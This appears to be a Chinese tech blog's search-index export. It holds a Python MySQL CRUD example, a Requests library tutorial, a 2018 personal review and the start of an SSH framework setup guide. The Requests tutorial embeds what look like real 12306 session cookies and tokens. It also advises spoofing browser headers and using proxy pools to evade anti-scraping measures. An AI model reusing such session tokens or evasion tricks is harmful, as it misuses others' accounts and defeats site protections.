mysql.connector.Error as err: print(err.msg)def execute(db_cursor, sql_str, data_obj=None): try: db_cursor.execute(sql_str, data_obj) except mysql.connector.Error as err: print(err.msg)if __name__ == '__main__': # 获取连接对象 conn = connect(config) # 设置自动提交事务 conn.autocommit = True # 获取操作游标 cursor = conn.cursor() # 创建数据库 create_database(cursor, "db_example") # 创建表 table_sql = """ CREATE TABLE `table_example` ( `t_id` INT(11) NOT NULL AUTO_INCREMENT, `name` VARCHAR(255) NOT NULL , `gender` ENUM('M','F') NOT NULL , `birth_date` DATE NOT NULL, PRIMARY KEY (`t_id`) ) ENGINE = INNODB """ create_tables(cursor, table_sql) # 插入数据 insertSQL = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES ('蓝士钦','M','1995-01-29') """ execute(cursor, insertSQL) # 插入数据 insert_sql_template = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES (%s,%s,%s) """ insert_sql_date = ('测试姓名', 'M', date(1996, 8, 30)) execute(cursor, insert_sql_template, insert_sql_date) # 插入数据 sql = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES (%(name)s,%(gender)s,%(birth_date)s) """ data = &#123; "name": "自由女神", "gender": "F", "birth_date": date(1874, 1, 1), &#125; execute(cursor, sql, data) # 修改数据 modify_sql = """ UPDATE `table_example` SET `name`='李小龙',`birth_date`='1940-11-27' WHERE `gender`='M' """ execute(cursor, modify_sql) # 查询数据 query_sql = """ SELECT `t_id`,`name`,`gender`,`birth_date` FROM `table_example` WHERE `birth_date` BETWEEN %s and %s """ start_date = date(1900, 1, 1) end_date = date(2000, 1, 1) try: execute(cursor, query_sql, (start_date, end_date)) for (t_id, name, gender, birth_date) in cursor: print("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;".format(t_id, name, gender, birth_date)) except mysql.connector.Error as err_obj: print(err_obj.msg) # 删除数据 delete_sql = """ DELETE FROM `table_example` WHERE `name` = %(name)s """ delete_param = &#123; "name": "李小龙" &#125; execute(cursor, delete_sql, delete_param) # 关闭操作游标 cursor.close() # 关闭数据库连接 conn.close()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python提高工作效率之Requests库]]></title>
    <url>%2Fdb2a9d2b%2F</url>
    <content type="text"><![CDATA[Python是一门强大且灵活的脚本语言，依赖众多强大的第三方库可以大大提高工作效率。在网络编程和自动化领域Python有着大量的实际应用，可以用C语言编写Python底层的实现库，然后通过Python简洁的语法，在实际工作中快速达到为所欲为的目的。由于最近工作需要配合测试人员进行一些数据接口的大量访问和数据的批量生成，为了能够高效的完成工作我选择了Python。工作中一些零散的任务我也基本上是以Python来完成，我决定分为几篇文章来对一些基本库的使用进行记录，方便日后查阅以及学习。本章节我先以比较常用的request库开始。 快速上手发送请求第一步：导入requests模块1&gt;&gt;&gt; import requests 第二步：请求网络资源1&gt;&gt;&gt; r = requests.get('https://www.lanshiqin.com') 使用方式非常简单，只需要引入requests的模块，然后发送GET请求只需要一行代码搞定。上述步骤将会使用GET请求网站并且将响应的Response对象赋值给r。 Requests还支持各种RESTFul方式的请求12345&gt;&gt;&gt; r = requests.post('http://httpbin.org/post', data=&#123;'key': 'value'&#125;)&gt;&gt;&gt; r = requests.put('http://httpbin.org/put', data=&#123;'key': 'value'&#125;)&gt;&gt;&gt; r = requests.delete('http://httpbin.org/delete')&gt;&gt;&gt; r = requests.head('http://httpbin.org/get')&gt;&gt;&gt; r = requests.options('http://httpbin.org/get') 响应内容1234import requestsr = requests.get('https://api.github.com/')print(r.text)# 输出文本内容 &#123;"current_user_url":"https://api.github.com/user","current_user_authorizations_html_url":"https://github.com/settings/connections/applications&#123;/client_id&#125;","authorizations_url":"https://api.github.com/authorizations","code_search_url":"https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","commit_search_url":"https://api.github.com/search/commits?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","emails_url":"https://api.github.com/user/emails","emojis_url":"https://api.github.com/emojis","events_url":"https://api.github.com/events","feeds_url":"https://api.github.com/feeds","followers_url":"https://api.github.com/user/followers","following_url":"https://api.github.com/user/following&#123;/target&#125;","gists_url":"https://api.github.com/gists&#123;/gist_id&#125;","hub_url":"https://api.github.com/hub","issue_search_url":"https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","issues_url":"https://api.github.com/issues","keys_url":"https://api.github.com/user/keys","notifications_url":"https://api.github.com/notifications","organization_repositories_url":"https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;","organization_url":"https://api.github.com/orgs/&#123;org&#125;","public_gists_url":"https://api.github.com/gists/public","rate_limit_url":"https://api.github.com/rate_limit","repository_url":"https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;","repository_search_url":"https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","current_user_repositories_url":"https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;","starred_url":"https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;","starred_gists_url":"https://api.github.com/gists/starred","team_url":"https://api.github.com/teams","user_url":"https://api.github.com/users/&#123;user&#125;","user_organizations_url":"https://api.github.com/user/orgs","user_repositories_url":"https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;","user_search_url":"https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;"&#125; r.text输出文本内容的编码是Request进行自动推断的，可以使用r.encoding来输出实际响应的编码，也可以自己自定Response的编码1r.encoding = 'utf-8' 二进制响应内容对于非文本请求，可以用字节byte的方式来访问响应内容Request库提供了r.content来访问二进制响应内容123456789import requestsfrom PIL import Imagefrom io import BytesIO# 请求图片r = requests.get('https://github.githubassets.com/images/icons/emoji/unicode/1f947.png?v8')# 打开图片i = Image.open(BytesIO(r.content))# 保存图片i.save('1f947.png', 'png') 原始响应内容对于一些文件的下载，可以使用Request库提供的r.raw获取原始响应内容可以使用r.raw.read(1024)指定大小的读取原始内容大多数情况下一般会将原始内容保存为文件1234567import requests# 请求数据r = requests.get('https://dl.pstmn.io/download/latest/osx', stream=True)print(r.raw.read(10))with open('osx.zip', 'wb') as fd: for chunk in r.iter_content(1024): fd.write(chunk) requests请求时要指定属性值stream=True,通过Requests库提供的iter_content方法可以指定一次读取多少数据 更加复杂的请求请求头参数以我个人的使用场景作为参考，使用请求头参数最多是爬虫程序，因为要伪装成正常的用户请求，所以不得不在请求头参数中指定UA和Cookie等值。除此之外，对于正常的程序访问来说我们一般也需要一些认证授权信息，可以通过自定义请求头参数来进行验证。12345678910111213141516import requestsurl = 'https://kyfw.12306.cn/otn/leftTicket/queryZ?leftTicketDTO.train_date=2019-01-07&amp;leftTicketDTO.from_station=XMS&amp;leftTicketDTO.to_station=YXS&amp;purpose_codes=ADULT'headers = &#123; 'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8', 'cache-control': 'no-cache', 'cookie': 'JSESSIONID=165AEDA56401B93F15E336494663D93E; tk=eZwgZIZASH0T-_CHKxmQrHzn0XZAtbknB1gk02D_ONMmk1110; RAIL_EXPIRATION=1546917370307; RAIL_DEVICEID=d0WOu4qSJ_ujU4sVmDaD6LfXgFfxHTWIBX__FHRtRH7o4E_3UvHcp86Iv2qCOFoEiDAh-ihWW2e6s7RnINhR1Ff8oR3In-wiOPokEhTyh1X-zci59jSrdIxTarXFrtWu03bxxzpuO0k8dfaKhCC3njv8PjH9mPtp; BIGipServerpassport=887619850.50215.0000; route=c5c62a339e7744272a54643b3be5bf64; BIGipServerotn=284164618.38945.0000; BIGipServerpool_passport=300745226.50215.0000; _jc_save_fromStation=%u53A6%u95E8%2CXMS; _jc_save_toStation=%u5C24%u6EAA%2CYXS; _jc_save_toDate=2019-01-06; _jc_save_wfdc_flag=dc; current_captcha_type=Z; _jc_save_fromDate=2019-01-07', 'if-modified-since': '0', 'referer': 'https://kyfw.12306.cn/otn/leftTicket/init?linktypeid=dc&amp;fs=%E5%8E%A6%E9%97%A8,XMS&amp;ts=%E5%B0%A4%E6%BA%AA,YXS&amp;date=2019-01-06&amp;flag=N,N,Y', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'&#125;r = requests.get(url=url, headers=headers)print(r.text) 上面的请求头参数，是我用Chrome浏览器访问12306购票网站，然后在开发者模式下查看网络请求得到的数据，通过请求头参数就可以完美的模拟浏览器的请求，服务端将无法区分出到底是来自用户正常的浏览器，还是一个自动化的脚步程序。通过这些特性我们可以做一些小工具方便自己。 POST请求参数在发起请求的时候设置data参数值来指定请求参数，data默认是一个表单数据格式，键值对表示要传送的参数名和对应的参数值。12345678910import requests# 请求数据data = &#123; 'CMD': '102', 'CITYNAME': '厦门市', 'KEYWORD': '641'&#125;r = requests.post('https://wx.shenghuoquan.cn/WxBusServer/ApiData.do', data=data)print(r.text) 如果要传送的格式为json格式，只需要在上述的data参数中指定data=json.dumps(data)即可，使用json需要在头部引入import json,不过最新版的Request库为我们做了自动转换，如果接口接受一个json而不是表单，request库会自动将data转换为json。上面的请求参数和请求地址，是我通过抓包工具得到的，某公交实时查询软件所请求的数据，通过post请求并且带上不同的参数值，可以达到和软件请求一样的效果。由于该软件打开有广告并且我认为一些功能是我用不到的，所以我可以通过抓包分析然后通过Python模拟请求，最终确定想要的数据接口后，自己开发一个基于该接口的App。 POST上传Multipart类型的文件通过Post请求上传文件是很常见的场景，在Postman等工具中可以方便的选择文件并且上传到指定地址，使用Python的Request一样很方便123456import requestsurl = 'http://httpbin.org/post'files = &#123;'file': open('1f947.png', 'rb')&#125;r = requests.post(url, files=files)print(r.text) 同样的，在请求的时候指定files参数值为一个打开的文件对象，files = {&#39;file&#39;: open(&#39;1f947.png&#39;, &#39;rb&#39;)}这行代码可以打开1f947.png这个文件作为 file的值。Python的语法优雅到如此简单。 高级用法代理目前中国大陆有长城防火墙，把Google等一些国外网站给过滤了，正常的直接网络是访问不到的，所以一般都会租用大陆以外的服务器作为代理去替我们访问目标网站，本地-&gt;代理-&gt;Google等被墙的网站。Requests库提供了代理功能，可以在Python中使用代理去访问网络资源，使用方式非常简单123456789import requestsproxies = &#123; "http": "http://127.0.0.1:1087", "https": "https://127.0.0.1:1087"&#125;r = requests.get("https://www.google.com/", proxies=proxies)print(r.text) 在请求的时候要指定proxies属性值为我们的代理配置，我使用的是自己搭建的VPN服务器，本地是Shadowsokes客户端，这里的配置需要根据实际情况做修改。代理的使用场景很多，不仅仅是访问被墙的网站，通过一条完美的代理线路以及程序的配合，可以绕过各种限制做各种为所欲为的事情。使用代理比较常见的是爬虫，通过代理池去访问目标网站降低被反爬虫程序的发现。 更多用法更多高级用法请访问Requests的官方文档:http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced快速入门文档:http://docs.python-requests.org/zh_CN/latest/user/quickstart.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2018年个人总结]]></title>
    <url>%2Fc271defc%2F</url>
    <content type="text"><![CDATA[2018年对我来说是很有纪念意义的一年。这一年，我毕业了，正式告别了我的学生生涯。今天是2018年12月30号，距离元旦还有一天。我依靠在床上，回忆着2018年的种种往事。 1. 关于心理状态年初的时候，一边在做毕业设计，一边为面试做准备。 毕设我的毕业论文课题是《基于Spring Cloud 的分布式网关系统的研究与应用》，由于很难落实到具体的软件项目，所以使得原本应该很简单的软件工程类毕设变得非常麻烦，为了写论文反复纠结这套工程该怎么设计，最终把项目做成了一个API接口框架，把Spring Cloud的组件都用一遍并组合起来做成多个集群落地应用，扩展实现一个统一规则的API网关，实现请求的防止重放攻击，请求一次有效等功能，结合Redis进行安全验证。论文答辩的时候主题是：安全性、稳定性、可配置。论文答辩的很从容，因为自己觉得项目做得还可以，但是最终没能拿到优辩，因为论文查重率超过了20%。我把大量的时间都花在了研究Spring Cloud上，论文无从下笔生搬硬套了别人的模板。评委老师也感到很为难，特意说本来可以拿到优辩的，但是论文重复率太多了，按照规定不能优辩。其实这也是我自己对论文不用心导致的，得知本来可以拿到优辩却没拿到的心情无以言表，我的论文对不起我的项目，希望在今后的生活和工作中不要再有类似的情况。想要拿到好成绩，就要提前计划准备并且花费足够多的精力去认真的完成。 面试在找工作方面，我属于半路出家，后知后觉抱佛脚型。在学校工作室的时候请了免修那些已经过时的编程课，然后折腾过各种编程语言和各种框架：C、C#、SQL server 微软系各种.NET Java、PHP、Python、Kotlin、Golang、Vue、HTML…还有树莓派、Unity3D等。学这么多不是因为浮躁，是因为对编程的向往和兴趣。整个大学时光过得非常充实。但是话说回来，真正从一而终的是Java。虽然从大一开始学C语言后，我第一个自学的语言是C#,然后做了一个类似于金山打字通的游戏，但是后面因为对Android很感兴趣，所以转向Java，大学三年写的最多的是Android的应用，也看过一些Android底层的东西，接过App外包。 半路出家半路出家是我从 移动端的Android平台转到了后端开发。直到临近毕业的前一年半，才开始转向后端开发，最终的兴趣点落在了后端上，有幸得到学校工作室方老师的信任，外派我到厦门市公安局做内部系统，从中发现了自己的很多不足以及后端知识的欠缺，回来后自己默默的补上。整个大学生涯，我的知识技术都是围绕和Java相关的技术栈。但是后端的Java我还是属于比较萌新的，出了常用的框架和工具，我的SQL真的很薄弱，以及高并发场景下锁的机制，JDK中的并发包下的那些源码，我都没来得及认真研究。 后知后觉后知后觉是因为早就已经过了属于我的最佳校招时间，阿里的校招在一年前就已经招18届应届生了。所以即使内推了我也迟迟排不上被面试的队伍，很难从那个大池子里挑中我的简历。真正写后端的时间其实也就一年多，就这样我匆匆忙忙的准备找Java后端的工作了，我让在阿里工作的表姐和姐夫帮我内推了，虽然没有报很大的希望，但是还是很自觉的每天六点起床补缺补漏，持续了将近两个月一点进度都没有。 临时抱佛脚我通过招聘平台投了很多阿里系的岗位，直到被菜鸟的社招岗电面，面试内容简单粗暴：数据库也有内存引擎，为什么还要用Redis？Redis能实现的那些场景数据库都可以实现，为什么不走数据库？ 缓存击穿、穿透、雪崩要怎么解决？，我被来自一线的工程师难住了，这些问题对于即将毕业的我来说根本没遇到过，对于技术岗临时抱佛脚是没用的。 同时我也认识到了技术之深，深不见底，今后一定要从一而终，认真钻研。 优辩和我失之交臂，阿里也没有面试成功，我深刻的意识到了自己的问题，做事情一定要全面而专注，从下决心的的那一刻起就应该从一而终，直到达成目标。 感恩通过一次次的面试，让我发现了自己的不足，并且做了很多课后工作，偷偷的补上。最终有幸投递到了我现在的公司，面试官问了我几个比较简单的问题，问的基本是正常应届生应该都掌握的知识，起先让我口述排序算法，当他听完我的口述后思索了一下，可能是不太信吧，于是让我在纸上写出来。由于有点紧张，给他的那一刻我好像察觉到写错了，结果我发现面试官微微的摇头后就确定我真的写错了，但是面试官没有拆穿我。我犯了一个非常低级的错误，但是依旧没有为难我。我很敬佩他的严谨认真以及和蔼可亲，我很荣幸😊 2. 关于工作学习关于工作刚到公司实习的时候，我属于萌新，领导给我分配了一个组长带我，当时可能时间紧任务重，实习入职第一天组长就让我用Kt写一个接口。我看到项目还是用Boot+Gradle构建的，忍不住有点小激动，内心的台词是，这也太极客了吧。除了Android和自己的项目是用Gradle以外，之前工作室的项目都是用Maven构建，所以感觉真的是来对部门了。入职后直接上手写某个子业务的代码，很多大业务我都还没搞清楚，也没有人跟我说，所以很多业务相关的我都一脸懵逼，之前在学校感觉很简单的微信开发，入职后发现结合业务后变得不再简单。因为当时不了解业务场景以及企业各个系统之间的关系，所以看到的都是各种系统的相互调用，没人和我整体讲产品内容和组织架构，所以一脸懵，很有挫败感。导致我在很长一段时间内没法掌握整个公司的业务，我所理解的业务很有限，在某一块业务没法一览全局，坐井观天的既视感非常强。现在我已经慢慢的从一个小功能扩展到其他模块，跟着组长一起做了几个业务系统，终于对大的条条框框和这些业务有了更多的了解。期间有段时间我沉浸到了一个前端水很深的业务中，每天被各种繁琐且耗时的任务缠着，领导可能以为我没啥事干吧，其实还挺多事的。很多核心的功能组长写了，剩下一些非核心但是却非常繁琐的地方我也写了不少。希望新的一年我能够有所突破，能够有所担当。 关于学习工作后感觉自主学习的时间越来越少了，虽然说工作本身也是在学习，但是和自己学习有很大的不一样.从工作中也收获到了很多，比如之前不懂日志输出的重要性，不懂如何定位线上问题，对Linux系统不熟练等，以及对一些系统框架的设计等，都是在工作之后才有了更加深刻的体会，学习到了很多。也很感谢我的组长能够带我。可能我的性格属于闷骚型，在很多时候都不够主动，我觉得我应该主动去请教问题，而不是等问题找上我。没有问题找上你，说明你离淘汰也不远了。我不希望做一个安于现状的人，我很怕变成这样一个人。希望新的一年，新的开始，我能够有所改变，成为一个积极主动的人。 3. 关于业余时间业余时间：学习，写博客，游泳，健身、击剑。 关于学习从实习开始从外面租房，陆陆续续买了很多书：《Java核心技术》卷一卷二都买了，虽然Java平时常见的编程场景编码基本够用，但是学无止境，基础知识我觉得很有必要反复咀嚼。特别是JDK源码，一直想系统性的学习却一直没有抽出时间学。另外还买了一些到目前为止从来都没有翻过几次的书《JVM高级特性与最佳实践》第二版、《实战Gradle》、《Spring 源码深度解析》。还有一些书是一时冲动买的，比如《Linux鸟哥的私房菜》、《Java高并发程序设计》、《数据结构与算法分析》Java语言描述、《剑指Offer》等书，这些书中翻看比较多的是《Java高并发程序设计》。还有网络相关的书就不一一列举了，买的书堆起来的高度已经和书桌相当了。买这么多书其实是觉得基础很重要，要反反复复的雕琢才能有所提高。我希望新的一年我可以规划好自己的学习时间，能够系统性的学习。现在我每天还在读英语，我希望未来的某一天，我能够有机会出国留学，成为一个更好的自己。 写博客博客原本打算一周一更新，但是工作后不像在学校。之前在学校的时候甚至可以几天一更新，因为有太多的基础知识需要学习，每天都有笔记可以总结，另一方面是有很多时间。虽然大学写的博客因为WordPress导出的数据库备份丢失了，导致迁移几次的博客全都没了。现在的博客其实是工作之后用Hexo重新搭建的，工作中经常会遇到一些比较玄学的问题，最终找到问题并且解决后我都会记录在博客中。本来计划系统性的写JVM相关的，以及一些非常基础性的知识总结，但是因为各种原因迟迟没有写。我希望新的一年，我能够经常写写博客，能够静下心来认真钻研每个基础知识。 关于游泳关于游泳，是大学舍友推荐的一家健身房，在万达健体无极，除了游泳还有其他健身项目，我办了一张游泳加健身的年卡。到目前基本连续游了一个月左右，从最初的旱鸭子，现在已经学会蛙泳了，就在昨晚还游了一次，游泳完后在66度的汗蒸房蒸一下，爽爆。 关于健身虽然现在在跑步机上五公里可以跑进22分钟34秒，超过了一点点目前兵哥哥及格线标准，但是我的身体还是挺弱的。之所以这么说，是因为从小到大我的体质都是偏弱的，虽然没有疾病，但是受不了高强度训练。虽然高中有参加体育队，进行过高强度训练，也许那时候还比较年轻，加上当时疯狂迷恋李小龙，信仰加持的我可以跳跃的很高，整个人很轻的感觉。自从上了大学之后，每天编程熬夜的无所顾忌，加上吃汉堡等垃圾食品，导致体型变胖，身体开始有点发虚了。 关于击剑健体无极除了游泳健身还有很多其他课程，我报了击剑课程（教练是我本家，比我小一岁，但是比我高一截，是个美女教练），在第一次热身的时候我就开始出现眩晕的症状。应该是跳跃性的动作我的呼吸不协调造成的缺氧。在后续的击剑课里，教练有针对性的对我进行热身，没有出现第一次那样的不适感，可能真的身体比较虚，希望新的一年我能够坚持锻炼并且瘦下来，领悟击剑精神，成为一个更好的自己。 4. 关于旅行去了南靖土楼、去了杭州、顺道去了一趟蚂蚁金服还愿（找虐） 南靖土楼和大学工作室的一群小伙伴相约去南靖，那天天很蓝，风景很美，心情也跟着如诗如画，很难忘的一次回忆。 杭州之旅毕业后还去了一次杭州，来了个毕业旅行。顺道去了蚂蚁金服全球训练营，从进电梯开始全程英语，很荣幸有机会能和来自全球的同学坐在同一间教室里。现场有来自台湾的留学生，也有来自美国的研究生，从签到表上看到40多个人里面只有寥寥无几的几个中文名，我的英语水平很差，整个下午听得一脸懵，站在右侧的阿里团队虎视眈眈的用英文和我们交流着，我当时的想法只有一个，我一定要把英语学好。从蚂蚁Z空间出来后，和留学生互相留了联系方式，坐在一起单独聊了聊各自的发展和规划。杭州之行不仅仅是看了风景秀丽的西湖，更多的收获是来自内心的认知，感受到了什么叫做真正的不能被忽视的优秀。 21天法则加奖励机制让我养成了每天早上背单词的习惯，到今天为止已经连续不间断的坚持了208天。我希望新的一年能够持之以恒，再接再厉。对于不好的生活习惯，我希望能够像奖励机制一样找到一种能够一次性解决的惩罚机制来克制自己。 接个话题我已经连续剃了两年的光头，其中有一部分原因算是我一种做错事的惩罚机制，但是不是及时处罚，所以剃了光头依旧错误不断。如果身上有个重置的按钮你会不会按？ 我的答案是会、而且重复不断的按，不断的格式化。主观意识是：清空杯子、重新来过。电脑手机ipad定期格式化，已经养成了一种强迫症 总结 我希望从2019年1月1日起，我不再剃光头，不再格式化。我要做最好的自己，我要开始留发。 我的野心依旧很大：打通任督二脉成为李小龙一样的男人、掌握核心科技成为比尔盖茨一样的精英、读万卷书行万里路。 新的一年：希望自己一步一个脚印，好好锻炼身体、认认真真的学习、兢兢业业的工作。———— 蓝士钦 2018年12月30日。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[整合SSH框架之基础搭建]]></title>
    <url>%2F21f173fb%2F</url>
    <content type="text"><![CDATA[SpringBoot把各种框架的整合用约定俗成的模板进行了默认配置，简化了各种框架的整合过程。在方便开发的同时也屏蔽了一些基础细节，在微服务大行其道的今天，Spring Boot 和 Spring Cloud 这些框架在开发时无疑是目前的首选，但是却不利于学习各个框架的基础，对于后端的初学者来说应当回过头来把每个框架的基础配置和使用都系统的学习一遍。强迫症的我决定要重新开始用传统的Spring+SpringMVC+Hibernate进行整合，这些框架都尽量采用目前最新的版本，后续对其他框架的整合配置以及实现进行迭代学习。 基本概念在Java后端开发中，使用的大多数框架都采用SSH、或者SSM，即使采用Spring Boot这样的框架也不例外，因为它本身也属于Spring家族，方便了各个框架的集成，开箱即用。 SpringSpring是一个Java开发框架，用来简化对象依赖以及生命周期管理。Spring的核心是IOC（控制反转）和AOP（面向切面编程），IOC容器可以创建并管理对象的生命周期，控制反转就是将对象的创建以及生命周期交给Spring 的IOC容器来控制，IOC从另外一个角度来看也叫做依赖注入，利用这一特性可以降低类之间的耦合度，并且通过Spring提供的AOP，可以很方便的定义自己的规则，将切面应用于某个方法上进行方法增强，比如日志输出，事物控制等。Spring的配置可以采用Java类的方式，但是为了降低与程序代码的依赖，一般使用xml外部配置文件来配置Spring。 Spring MVCSpring MVC 是用于web端的Servlet开发框架，用来简化web端编程。在Spring MVC出现之前，Java的web端编程一般采用服务器容器提供的原生API，比如Tomcat等主流服务器都支持的Servlet规范所提供的各种API接口，开发者通过HttpServletRequest与HttpServletResponse接口提供的方法来接收处理用户的请求与响应请求。当一个项目很庞大且复杂的时候，一般会对Servlet提供的这些接口进行统一封装，比如请求方式的定义，请求体参数的获取，请求响应对象数据等。Spring MVC屏蔽与业务无关的底层代码，帮助开发者做了Servlet的封装，并且依赖Spring的强大特性，开发者只需要将请求配置给Spring MVC提供的DispatcherServlet，就可以在自己的业务逻辑中使用Spring 和SpringMVC带来的强大功能 HibernateHibernate是一个ORM框架，用来简化数据库操作。在Hibernate出现之前，Java操作数据库一般采用JDBC提供的API直接去操作，需要自己编写大量的SQL，容易一不小心就直接拼接上一个非法的参数变量导致SQL注入，而且每次将结果重新赋值给Java对象显得非常繁琐，没有通用性。所以在项目中一般会对JDBC进行再次封装，采用Java反射等技术实现了一个ORM的功能，这种功能和目前主流的Hibernate与Mybatis类似，都对JDBC的数据库操作进行了封装。但是Hibernate更为强大。众所周知，关系型数据库虽然将现实事物进行了抽象，但是关系型数据库的传统操作还是使用SQL，SQL本身是面向过程的，人类去编写很复杂的一串SQL时如果没有足够的经验很容易会写出BUG，比如多表关联查询时可能要写很长的SQL，并且整个业务系统可能有很多地方有类似的查询，如果全部用SQL编写可能很耗时，所以出现了关系实体映射的ORM框架。Hibernate对SQL进行了抽象，开发人员直接操作Java对象就可以操作数据库，最终的SQL由Hibernate翻译生成，对象操作更不容易出错且更加直观。除此之外Hibernate还做了很多封装，比如数据库不同级别的缓存策略，事物策略等，框架本身是为了简化开发成本。 创建项目开发工具和框架版本 操作系统: MacOS Mojave 10.14 JDK版本: 1.8.0_192 IntelliJ IDEA版本: Ultimate 2018.2.5 Maven版本: 3.3.9 Spring 5.1.1.RELEASE Spring MVC 5.1.1.RELEASE Hibernate 5.3.7.Final 无论采用IDEA还是Eclipse，在使用Maven构建项目时，勾选Create from archetype，选择从模板创建并找到 org.apache.maven.archetypes:maven-archetype-webapp这个模板底下的maven-archetype-webapp:RELEASE，用来快速创建一个Maven构建的Java Web工程。有关Spring的相关文档可查阅官网https://docs.spring.io/spring/docs/5.1.1.RELEASE/spring-framework-reference/index.html 引入依赖pom.xml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!-- 添加 Spring MVC 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 Spring ORM 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-orm&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 Hibernate 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-agroal&lt;/artifactId&gt; &lt;version&gt;5.3.7.Final&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;!-- 添加 C3P0 数据库连接池依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--添加 MySQL 连接驱动依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.13&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 jackson-core 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 jackson-databind 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; 配置web.xmlweb.xml123456789101112131415161718192021222324252627282930313233&lt;web-app&gt; &lt;display-name&gt;SSH 框架整合&lt;/display-name&gt; &lt;!-- 配置Spring的监听器，Spring 容器启动时默认会加载 WEB-INF 目录下的 applicationContext.xml 文件 --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!--当 WEB-INF 目录下的 applicationContext.xml 文件不存在时，一定要指定自定义名称的配置文件--&gt; &lt;!-- 定义自定义名称的 Spring 上下文配置文件--&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!--配置 Spring MVC 的 servlet 拦截器--&gt; &lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!--配置初始化时要加载的自定义配置文件，如果不配置则默认为 WEB-INF 目录下的 app-servlet.xml 文件--&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;!-- 配置servlet映射所匹配的url --&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 配置 SpringWEB-INF/app-context.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"&gt; &lt;description&gt;Spring 配置&lt;/description&gt; &lt;!-- 加载外部配置文件 --&gt; &lt;bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;!-- 如果有多个配置文件可以用多个value标签进行配置 --&gt; &lt;value&gt;classpath:db.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; 